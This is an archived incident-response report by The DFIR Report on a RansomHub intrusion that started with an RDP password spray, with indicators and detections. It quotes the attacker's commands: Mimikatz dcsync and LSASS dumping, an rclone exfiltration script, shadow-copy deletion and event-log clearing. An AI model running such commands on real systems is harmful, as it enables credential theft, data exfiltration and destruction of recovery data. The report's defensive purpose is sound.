---
title: "Hide Your RDP: Password Spray Leads to RansomHub Deployment - The DFIR Report"
source_url: "https://thedfirreport.com/2025/06/30/hide-your-rdp-password-spray-leads-to-ransomhub-deployment/"
published: "2025-06-30T00:20:06+00:00"
author: "editor"
archived_at: "2026-08-25"
source_html: "2025-06-30_RDP-Password-Spray-to-RansomHub.html"
---

# Hide Your RDP: Password Spray Leads to RansomHub Deployment - The DFIR Report
## Key Takeaways

- Initial access was via a password spray attack against an exposed RDP server, targeting numerous accounts over a four-hour period.

- Mimikatz and Nirsoft were used to harvest credentials, with evidence of LSASS memory access.

- Discovery was accomplished using living-off-the-land binaries as well as Advanced IP Scanner and NetScan.

- Rclone was used to exfiltrate data to a remote server using SFTP.

- The threat actor deployed RansomHub ransomware network wide, which spread over SMB and was executed using remote services.

This case was featured in our June 2025 DFIR Labs Forensics Challenge and is available as a lab today here for one time access or included in our new subscription plan. It was originally published as a Threat Brief to customers in Feb 2025.

## The DFIR Report Services

- Private Threat Briefs : 20+ private DFIR reports annually.

- Threat Feed : Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.

- All Intel : Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel.

- Private Sigma Ruleset : Features 170+ Sigma rules derived from 50+ cases, mapped to ATT&CK with test examples.

- DFIR Labs : Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.

#### Table of Contents:

- Case Summary

- Services

- Analysts

- Initial Access

- Execution

- Persistence

- Defense Evasion

- Credential Access

- Discovery

- Lateral Movement

- Command and Control

- Exfiltration

- Impact

- Timeline

- Diamond Model

- Indicators

- Detections

- MITRE ATT&CK

## Case Summary

This intrusion began in November 2024 with a password spray attack targeting an internet-facing RDP server. Over the course of several hours, the threat actor attempted logins against multiple accounts using known malicious IPs (based on OSINT). Several hours later they then logged in via RDP with one of the previously compromised users and ran a series of discovery commands, including various net commands to enumerate users and computers. Credential access tools, specifically Mimikatz and Nirsoft CredentialsFileView , were used to extract stored credentials and interact with LSASS memory.

Approximately two hours after initially authenticating to the beachhead host, the threat actor used RDP to move laterally to two domain controllers. Once on the domain controllers, they accessed the Windows Administrative Tools via the graphical user interface (GUI) to examine the DNS management console. Simultaneously, the threat actor continued to access additional servers and endpoints, conducting similar activities, namely reconnaissance via net commands and credential harvesting using Mimikatz throughout the environment. During this same time frame, Advanced IP Scanner was downloaded via the Microsoft Edge browser, and a network scan was initiated from the beachhead host.

The threat actor then continued lateral movement to additional hosts targeting backup servers, file servers, hypervisors, and more domain controllers. They utilized Mimikatz across several of these hosts outputting CSV files named for the child domains the hosts belonged to. Based on the logs we assess this activity was likely to confirm their pivot domain administrator account was present in the various domains. The threat actor concluded their operations for the day by viewing documents on various file shares after successfully gaining access to several high-value servers within the environment via RDP using their high-privileged account.

On the second day, they returned to the beachhead and reran Advanced IP Scanner and also SoftPerfect NetScan for broader network mapping. Later, Atera was installed via RDP on two backup servers, likely to maintain persistent remote access through legitimate administrative channels. The threat actor continued with another round of discovery.

On the start of the third day they employed Rclone to exfiltrate files over SFTP. The Rclone setup used helper scripts and was configured to include specific file types, such as documents, spreadsheets, emails, and image files. The transfer occurred over port 443, but the traffic was confirmed to be SFTP.

On the fifth day the threat actor returned via Splashtop installed on one of the backup servers. From there they performed another network sweep using Netscan. They then used RDP to connect to several hosts including domain controllers where several user passwords were reset. A little over an hour after becoming active again, now on the sixth day of the intrusion, the threat actor connected to a new server, ran another round of Netscan and then prepared for their ransomware deployment. They dropped the binary named amd64.exe and executed it on the host. This started a chain where files on the local host were encrypted but it also reached out to remote hosts to transfer a copy of the ransomware over SMB and then execute that file on the hosts using a remote service.

Once ran, the ransomware tried to kill any running virtual machines, setup permissive symlinks, delete shadow copies, and clear event logs. Following this, files were encrypted and a note linking the ransom to the RansomHub group was dropped. The Time to Ransomware (TTR) for this intrusion was around 118 hours over six calendar days.

## Analysts

Analysis and reporting completed by @tas_kmanager , @iiamaleks and UC2

## Initial Access

The threat actor’s first observed interaction with the victim environment occurred in late November 2024, when they initiated a series of password spraying attempts against multiple user accounts via a publicly accessible Remote Desktop Protocol (RDP) server. The activity spanned approximately four hours and originated from two IP addresses under one ISP: 185.190.24.54 and 185.190.24.33 .

Open-source intelligence (OSINT) confirms that the IP addresses has history of malicious activities. According to reports from AbuseIPDB , these IPs have been associated with numerous failed authentication attempts targeting firewalls and administrative web interfaces, indicating their use in broader scanning and credential attacks.

The threat actor successfully authenticated into six distinct user accounts, as evidenced by multiple instances of Windows Security Log Event ID 4624, indicating successful logons.

The threat actor selected a user and performed a login, about four hours after the successful logon occurrences from the password spray activities. The user will be referred as Initial Access User from this point in this report. Note that the threat actor is using different IP address, 164.138.90.2 , that has different ISP and geo information.

Digging deeper in to the login we observed that the Initial Access Use r logged in with Elevated Token (Elevated Token: Yes), which means the session this event represents is elevated and has administrator privileges – Event 4624 Microsoft Learn .

Additionally, we also observed the following IP addresses accessing the Initial Access Use r and one other user in the following days after the initial breach. We do not have evidence that this access was related to threat actor tracked in this case.

| IP Address | ISP | Country

| 37.120.143.202 | M247 Europe SRL | Belgium

| 38.180.139.56 | M247 Europe SRL | United Kingdom

| 5.181.86.158 | Internet Solutions & Innovations LTD. | Ukraine

## Execution

Throughout the attack we observed the execution of multiple threat actor controlled scripts and commands.

#### Visual Basic

nocmd.vbs was executed as part of the exfiltration process using RClone. This Visual Basic script creates a WScript process that runs the RClone exfiltration batch script, rcl.bat . More details on this script will be explored on the Exfiltration section.

#### Batch Script

rcl.bat was a batch script used to execute a RClone job. It receives further instructions on which files to exfiltrate from a file named include.txt . More details on this script will be explored on the Exfiltration section.

#### PowerShell

As part of the Ransomhub ransomware operation, numerous PowerShell commands were executed. More details on this will be explored on the Impact section.

- To force shutdown VM in Hypervisor Servers
powershell.exe -Command PowerShell -Command "{ Get-VM | where { $_.Name -ne 'VM01' -and $_.Name -ne 'VM02' } | Stop-VM -Force
- To remove volume shadow copy
powershell.exe -Command PowerShell -Command "\"Get-CimInstance Win32_ShadowCopy | Remove-CimInstance\""

#### Windows Command Shell

As part of the Ransomhub ransomware operation, numerous Windows shell commands were executed. More details on this will be explored on the Impact and Defense Evasion sections.

The threat actor also executed common discovery commands such as nslookup , net and more. More details on this will be explored on the Discovery section.

#### RDP Session Executions

The threat actor leveraged their RDP session to interact directly with the desktop environment, as evidenced by the parent process explorer.exe launching tools and binaries like Mimikatz, CredentialsFileView, Advanced IP Scanner, and NetScan.

## Persistence

During the intrusion the threat actor deployed Atera and Splashtop RMM tools on several hosts. These tools enabled persistence by setting up services on the hosts which can be observed in event ID 7045.

At a later stage of the operation, the threat actor was observed changing multiple users passwords utilizing net command, to the same password. Besides persistence, the timing of the password changes around the ransomware deployment suggests the threat actor may have done it to help the ransomware spread or to block admin access during the attack.

## Defense Evasion

During the intrusion the threat actor did not clear all files they dropped, but they did pay special attention to specifically return to the file servers some 20 hours after exfiltration activity to remove the Rclone related files discussed in the Exfiltration section.

Along with the execution of the ransomware, we observed the following commands used to remove evidence from the host and inhibit recovery activity.

To run vssadmin.exe and delete shadow copy files:
cmd.exe /c ""vssadmin.exe Delete Shadows /all /quiet""
To run fsutil and allow remote to local and remote to remote symbolic links:
cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2L:1"" cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2R:1""
To run wevutil and clear Windows logs:
cmd.exe /c wevtutil cl security cmd.exe /c wevtutil cl system cmd.exe /c wevtutil cl application

## Credential Access

As we observe in most of our intrusions, once the threat actor gained access to the RDP-exposed beachhead host via password spraying, they leveraged well-known credential harvesting tools, specifically Mimikatz and Nirsoft’s CredentialsFileView. These tools were deployed on compromised hosts to target different sources of stored credentials.

On the beachhead host, we observed both tools being dropped on the Desktop of the compromised user. First CredentialsFileView was used to decrypt credential files stored on Windows systems, revealing saved passwords in plain text. This activity can be detected by Event ID 5379, indicating credential enumeration and read operations on stored credentials.

Subsequently, Mimikatz was used to capture various sensitive information. Its execution resulted in the creation of several output files based on the child domains.

The execution patterns for these align with event ID 4662 logs for Active Directory sync events:

The number of logs do not indicate a full sync of all AD accounts, but likely the threat actor was checking to see if their privileged account existed across all domains and share the same password. With a command similar to:
lsadump::dcsync /domain:CHILD.DOMAIN.EXAMPLE /user:DOMAINADMINUSER /csv > CHILD.csv
Further Sysmon log analysis suggests that Mimikatz was also likely run with commands targeting the Local Security Authority Subsystem Service (LSASS) process, such as when the command “sekurlsa::logonpasswords” was used, a command designed to extract credentials and tickets directly from LSASS memory. If the full command line is not available, another way to capture Mimikatz targeting LSASS is by looking for process accessing LSASS (Sysmon Event 10).

## Discovery

The threat actor leveraged a combination of living-off-the-land techniques and third party tools to perform discovery activities. They used built-in Windows commands such as net and nltest , third-party tools like Advanced IP Scanner and SoftPerfect’s NetScan, and Microsoft Management Console applets.

#### The Classics, Living-off-the-land Commands

Living-off-the-land discovery command sequence in the beachhead RDP server

The threat actor utilized these commands to perform discovery of the victim network:

- Nslookup – Resolve internal domain name to identify domain controllers or DNS info

- Net – Enumerate user groups, domain accounts, computers, and password policy settings to identify privileged users and map the domain environment

- Nltest – Discover domain trust relationships to explore potential paths for lateral movement or cross-domain access.

- Ipconfig – Retrieve detailed network interface configuration to learn about the local host’s IP settings, DNS, and gateway

- Route – Display routing table to analyze reachable networks and plan pivoting or data exfiltration paths

- Ping – Test connectivity and resolve internal hostnames to identify active and reachable systems within the network

Whenever the threat actor successfully logged in into a new endpoint, they performed the combinations of above commands over and over again.

Living-off-the-land discovery command sequence on other hosts and servers

#### Advanced IP Scanner

The threat actor downloaded the Advanced IP Scanner from the official website, this can be observed from the Zeek/Suricata logs, specifically with the rule “ ET ADWARE_PUP IP Scanner Tool Update Request (GET)”

The installer was saved in the domain admin account’s Downloads folder. The threat actor executed the Advanced IP Scanner in 3 different occasions. Once used, they deleted the binary file.

#### SoftPerfect NetScan

The threat actor dropped netscan.exe in the Initial Access User’s desktop folder. After gaining access to the Domain Admin account, they also dropped the binary in desktop folders on multiple hosts and servers, notably a backup server, share server, hypervisor server and workstations. From Sysmon event ID 1, we can see the execution of the NetScan tool.

From one of the workstations that executed NetScan tool, we can see that there were 16 different ports scanned. This data was captured as Sysmon event ID 3. The top scanned ports are 135 (RPC), 445 (SMB), 3389 (RDP) and 137 (NetBIOS)

From the same workstation, captured by Sysmon event ID 22, the tool was observed also making DNS requests for hosts around the network.

During these executions, an artifact of NetScan share enumeration was observed with a file creation event of file delete[.]me on remote hosts. This artifact is created when the NetScan tool is used to identify write access to file shares on the network – SoftPerfect Forum . We can see it as Sysmon event ID 11 – File Creation in the destination (target) host or Sysmon event ID 1 – Process Creation via rundll32.exe C:\Windows\system32\davclnt.dll,DavSetCookie commands in the source host.

Sysmon event ID 11 – File Creation in the destination (target) host

Sysmon event ID 1 – Process Creation in the source host

#### File Browsing

The threat actor was also observed checking the documents on the file share servers and network shares. They were checking PDF and document files, utilizing viewers such as Google Chrome and Microsoft Edge for PDF files and Windows WordPad for doc files.

Documents accessed by the threat actor

The threat actor was also observed opening a database application on one server.

#### Microsoft Management Console (MMC)

Microsoft Management Console (MMC) snap-ins are modular administrative tools that provide a graphical interface for managing Windows system components and services. Each snap-in, such as dsa.msc or dssite.msc , focuses on a specific area of system or directory management within a unified console environment. Once the threat actor compromised a domain admin account, they executed several MMC snap-ins on multiple Domain Controller (DC) servers.

MMC discovery command sequence on DC servers

The threat actor utilize these applets to perform discovery of the victim network:

- dnsmgmt.msc – Browse and manipulate DNS server configuration

- domain.msc – View and manage domain, forest or trusts configuration

- dssite.msc – View and manage replication, site topology, and subnet associations in Active Directory

- dsa.msc – Manage users, groups, computers, and organizational units (OUs) within an Active Directory domain

## Lateral Movement

### RDP

Initial lateral movement within the victim network was achieved through the use of the Remote Desktop Protocol (RDP). Analysis of security event logs across multiple compromised hosts revealed successful RDP attempts originating from internal systems, including the beachhead host. These attempts can be observed when looking at Security event ID 4624, with a LogonType 10, as shown below.

### SMB

On day six of the intrusion, the threat actor started preparing for the automated deployment of the ransomware payload throughout the network.

After the initial execution of the ransomware binary on a system, the spawned process began establishing connections with other internal systems. These network communications involved the transfer of the ransomware binary to remote hosts using the Server Message Block (SMB) protocol. Network analysis revealed evidence of SMB operations with random filenames, all having the same size, as observed below from Zeek.

Confirmation of the ransomware’s presence on target systems can also be obtained by looking at file creation events, for instance looking at the $MFT or Sysmon Event ID 11. Here, the file events documented the appearance of the ransomware executable consistently with randomly generated filenames (e.g C:\[random_string.exe].exe ) as already observed from Zeek.

## Command and Control

### Atera and Splashtop

During the intrusion the threat actor was observed deploying Atera with Splashtop, a legitimate RMM tool. This activity allowed them to blend in with normal network activity utilizing Atera’s built-in features for remote access, as Atera integrates with several remote agent tools. We were able to trace usage of Splashtop which was used during this intrusion. Splashtop leaves logs in the agent_log.txt file located in the C:/Program Files (x86)/Splashtop/Splashtop Remote/Server/log/ folder, as indicated in the public LOLRMM website .
<1><REDACTED DATE> <REDACTED TIME> 11600[App] event WM_WTSSESSION_CHANGE session: 5 id:2 <1><REDACTED DATE> <REDACTED TIME> 11600[Manager] TA1, 32-200, 0, <REDACTED DATE> <REDACTED TIME> <1><REDACTED DATE> <REDACTED TIME> 11600[Handler] TSS, 32-200, 0x00026DD0(0x00002ECC) <1><REDACTED DATE> <REDACTED TIME> 11600[Handler] NBIPC - SetCloudRegion <1><REDACTED DATE> <REDACTED TIME> 11600[Handler] cloud region <REDACTED> <1><REDACTED DATE> <REDACTED TIME> 11600[Handler] NBIPC - SessionChange <1><REDACTED DATE> <REDACTED TIME> 11600[Handler] Resend client public ip <1><REDACTED DATE> <REDACTED TIME> 11600[Handler] TF1, 32-200, 0x00026DD0(0x00002ECC) <1><REDACTED DATE> <REDACTED TIME> 11600[Handler] save logon user <REDACTED DOMAIN ADMIN> at time<REDACTED DATE> <REDACTED TIME> <1><REDACTED DATE> <REDACTED TIME> 11600[Handler] save logon user <REDACTED>$ at time <REDACTED DATE> <REDACTED TIME> <1><REDACTED DATE> <REDACTED TIME> 11600[Handler] TF2, 32-200, 0x00026DD0(0x00002ECC)
Threat Actor Hostname and Display Name Identification via SPLog.txt

In addition to identifying the usage of Splashtop through agent_log.txt , further evidence was obtained from the SPLog.txt file, which logs client-specific details when a remote session is initialized.

Extracted Indicators:

- Display Name ( disp name ):
<1><REDACTED DATE> <REDACTED TIME> SM_00352[Auth] disp name johnattan johnattan
- This entry likely reflects a user-defined identifier or alias configured within the Splashtop environment. It may represent the threat actor’s name or a deceptive identifier designed to blend into legitimate user activity.

- Hostname ( client ):
<1><REDACTED DATE> <REDACTED TIME> SM_12412[Auth-L] ok, client (WINVM) can connect to AV server
- The machine hostname WINVM was recorded during the Splashtop connection process. This suggests the use of a virtualized system by the threat actor.

Forensic Context:

These identifiers are useful pivot points for correlating across additional forensic artifacts such as:

- Security Event Logs (e.g., Event ID 4624 with matching host/user as seen below)

- Registry entries related to Splashtop or RMM installations

- Endpoint detection logs or memory forensics

The forensic methods for extracting and interpreting this data are consistent with guidance outlined in Synacktiv’s forensic analysis of legitimate RATs , which describes how SPLog.txt supports attribution and behavioral profiling during incident response.

Correlation from this log and Security Event ID 4624 event logs (especially logs with a loopback source IP address) can be used to confirm the remote access activity.

Additional Forensic Detail: Sysmon Event ID 24 (ClipboardChange)

Another valuable source of context came from Sysmon Event ID 24 , which captures clipboard changes. In the observed event:
"ClientInfo": "user: REDACTED_DOMAIN\\REDACTED_USER ip: 10.0.2.15 hostname: WIN"
This log entry shows that the IP address 10.0.2.15 was assigned to the threat actor’s VM. Notably, this address is commonly used as the default assignment in VirtualBox NAT networking mode , indicating the threat actor likely used a VirtualBox-hosted environment for initial or persistent access.

### Direct RDP access

From day one and initial access, the threat actor was observed continuously using RDP to maintain access to the compromised environment. They used it to establishing interactive sessions throughout which they could execute commands, move laterally and continue their malicious actions, even while having other means to maintain their access to the infrastructure. Below is a display of their public IP usage by day, as already mentioned in the previous sections.

Defenders should look for external IP login in their Security Event Logs, or by monitoring their networks, and filtering for the RDP protocol and port 3389. Threat actor’s will also enable RDP access by modifying registry keys ( hkey_local_machine\\software\\policies\\microsoft\\windows nt\\terminal services\\fdenytsconnections ) and firewall settings​ allowing inbound RDP (port 3389).

When looking at the JA4S hash, it appears the IP addresses used for RDP can be divided in two groups:

|
IP
|
JA4s
|

|
185.190.24.33
|
t100100_c014_bc98f8e001b5
|
Password Spray Source

|
185.190.24.54
|
t100100_c014_bc98f8e001b5
|
Password Spray Source

|
5.181.86.158
|
t100100_c014_bc98f8e001b5
|
Other RDP Access Source

|
38.180.139.56
|
t120200_c030_5333cdffa7d9
|
Other RDP Access Source

|
164.138.90.2
|
t120200_c030_5333cdffa7d9
|
Threat Actor Logon Source

|
37.120.143.202
|
t120200_c030_5333cdffa7d9
|
Other RDP Access Source

## Exfiltration

During this intrusion, Rclone was utilized on multiple file servers to facilitate the exfiltration of data via SFTP. Rclone was dropped along with multiple helper files that aided its execution:

The nocmd.vbs file contained a set of VBS commands intended to execute the rcl.bat script.
Set WshShell = CreateObject("WScript.Shell") WshShell.Run chr(34) & "C:\ProgramData\Veeam\rcl.bat" & Chr(34), 0 Set WshShell = Nothing
rcl.bat was a Batch file containing the main command to execute the rclone executable.
rclone copy [REDACTED]:/mnt/sdd/REDACTED --include-from include.txt
Within the includes.txt was a set of file extensions that should be included for the exfiltration.
*.doc *.docx *.pdf *.htm *.html *.xls *.xlsx *.jpg *.jpeg *.png *.pst *.msg *.edb *.mbox
The following diagram visually demonstrates the execution chain of Rclone:

During the execution of Rclone, outbound connections were observed to 38.180.245.207:443 .

Despite the port number, this traffic was in fact SFTP traffic being used to transfer the data.

#### Volume of Data Transferred:

Analysis of Zeek logs revealed the total amount of data exfiltrated to the remote server. We used the source bytes field as this field counts the number of bytes sent from the source to the destination in a network connection. It measures the volume of data flowing from the initiator to the responder. By aggregating the source.bytes field and converting it to gigabytes using a Splunk query such as:
network.protocol=ssh "network.direction"!=internal | stats sum(source.bytes) as total_source_bytes | eval total_gb=round(total_source_bytes / 1000000000, 2)
The total amount of data transferred was calculated to be:

2.03 GB

This volume aligns with the targeted exfiltration of data over a 40-minute time frame.

While no Sysmon file create events were observed for the Rclone configuration file, it was able be seen from the MFT and NTFS artifacts that can be extracted from memory.

## Impact

On the sixth day the threat actor began the deployment of ransomware on the network with a ransomware binary named amd64.exe . We were able to observe again via the SPLog.txt log from Splashtop, that this was how the threat actor brought the ransomware binary into the environment and it also revealed the remote directories on the threat actors host where they had the file staged.

In Sysmon logs, this was viewed as being created by the Explore.exe session from the Splashtop connection.

The original ransomware executable was invoked directly via cmd.exe from a RDP session.
amd64.exe -pass [REDACTED]
Once the ransomware began execution it ran a set of commands that would stop any Hyper-V virtual machines running on the system, delete Shadow Copies, and events from a few Windows event channels. In addition, it leveraged built-in lateral movement capabilities to propagate to other hosts in the network through SMB, the -only-local flag was used to prevent a propagation loop for the ransomware. For the remote hosts, the ransomware was executed via a remote service, with random 6-letters name as image name and service name. This can be seen from event ID 7045 – Service Control Manager provider.

After successful execution the ransomware left impacted files encrypted and the following ransomware note:

## Timeline

## Diamond Model

## Indicators

### Atomic
RDP Password Spray 185.190.24.54 185.190.24.33 RDP Initial Access 164.138.90.2 Exfiltration Destination 38.180.245.207:443

### Computed
setup.msi eba5bfca73c2754fbf93ed64fa224132 b746c91e014205db94f775bb6db480387c9ebc20 ec45ebd938e363e36cacb42e968a960fbe4e21ced511f0ea2c0790b743ff3c67 amd64.exe 6f3a658fc32b4a378716ac167ebaf5ac 19138d3c197ee1e59756d1f4fc3fd66809f44c1b 25117dcb2d852df15fe44c5757147e7038f289e6156b0f6ab86d02c0e97328cb netscan.exe a768244ca664349a6d1af84a712083c0 39300863bcaad71e5d4efc9a1cae118440aa778f e14ba0fb92e16bb7db3b1efac4b13aee178542c6994543e7535d8efaa589870c nocmd.vbs 8e0b1f8390acb832dbf3abadeb7e5fd3 02e6ff95949fdf341daee846820d40289ab65985 4775dfb24f85f5d776f538018a98cc6a9853a1840f5c00b7d0c54695f03a11d9 rcl.bat 1cc1534b70b8d2b99b69a721c83e586a 6ac2d77631f775797cd0029e199a5dfe83f47b4c ffd09a5c27938d1f7424ed66d1474cfeb3df72daabdf10e09f161ed1ffd21271

## Detections

### Network
ETPRO INFO Observed Atera Remote Access Application Activity Domain in TLS SNI ET INFO Splashtop Domain (splashtop .com) in TLS SNI ET INFO Splashtop Domain in DNS Lookup (splashtop .com) ETPRO INFO Observed Splashtop Application Activity Domain in TLS SNI ET ADWARE_PUP IP Scanner Tool Update Request (GET)

### Sigma

Search rules on detection.fyi or sigmasearchengine.com
88f680b8-070e-402c-ae11-d2914f2257f1 : PowerShell Base64 Encoded IEX Cmdlet fed85bf9-e075-4280-9159-fbe8a023d6fa : Advanced IP Scanner - File Event bef37fa2-f205-4a7b-b484-0759bfd5f86f : PUA - Advanced IP Scanner Execution 962fe167-e48d-4fd6-9974-11e5b9a5d6d1 : LSASS Access From Non System Account d9047477-0359-48c9-b8c7-792cedcdc9c4 : PUA - NirCmd Execution As LOCAL SYSTEM 4e2ed651-1906-4a59-a78a-18220fca1b22 : PUA - NirCmd Execution e37db05d-d1f9-49c8-b464-cee1a4b11638 : PUA - Rclone Execution 34986307-b7f4-49be-92f3-e7a4d01ac5db : Rclone Config File Creation 06d71506-7beb-4f22-8888-e2e5e2ca7fd8 : Mimikatz Use 962fe167-e48d-4fd6-9974-11e5b9a5d6d1 : LSASS Access From Non System Account d0d2f720-d14f-448d-8242-51ff396a334e : HackTool - Generic Process Access 1c67a717-32ba-409b-a45d-0fb704a73a81 : System Network Connections Discovery Via Net.EXE
Private Rules:
Suspicious NTFS Symlink Behavior Modification : 9d7be3f1-729d-472c-b114-e158b76168c2 Windows Event Log Clearing Using Wevtutil : 0c8d866a-c0de-4987-97ee-7f401677a9e8 NirSoft CredentialsFileView Execution : 2d8fa780-c2ea-4c26-9c01-71d531a2dbbb NirSoft Tools Execution : 8bf0aaee-e44e-4455-81d1-d46fb42ae889 Use of Rclone to exfiltrate data over an SSH channel : 7019b8b4-d23e-4d35-b5fa-192ffb8cb3ee

### Yara
BINARYALERT_Hacktool_Windows_Mimikatz_Copywrite BINARYALERT_Hacktool_Windows_Mimikatz_Files DITEKSHEN_INDICATOR_KB_ID_Ransomware_Rapid DITEKSHEN_INDICATOR_RMM_Atera DITEKSHEN_INDICATOR_RMM_Atera_CERT ELASTIC_Multi_Ransomware_Ransomhub_4A8A07Cd MAL_RANSOM_Darkside_May21_1 SEKOIA_Yara_Runascs SIGNATURE_BASE_HKTL_NET_NAME_Runascs SIGNATURE_BASE_MAL_RANSOM_Darkside_May21_1 SIGNATURE_BASE_SUSP_Gobfuscate_May21 SUSP_GObfuscate_May21

## MITRE ATT&CK

Clear Windows Event Logs - T1070.001 Data Encrypted for Impact - T1486 DCSync - T1003.006 Domain Account - T1087.002 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 External Remote Services - T1133 File and Directory Discovery - T1083 File and Directory Permissions Modification - T1222 Indicator Removal - T1070 Inhibit System Recovery - T1490 Lateral Tool Transfer - T1570 Local Account - T1087.001 Local Groups - T1069.001 LSASS Memory - T1003.001 Network Service Discovery - T1046 Password Spraying - T1110.003 PowerShell - T1059.001 Process Discovery - T1057 Remote Access Software - T1219 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 System Network Configuration Discovery - T1016 Valid Accounts - T1078 Visual Basic - T1059.005 Windows Command Shell - T1059.003 Windows Service - T1543.003
Internal case #TB33490 #PR36501

##### Share this entry

- Share on Facebook

- Share on X

- Share on WhatsApp

- Share on Linkedin

- Share on Reddit

- Share by Mail
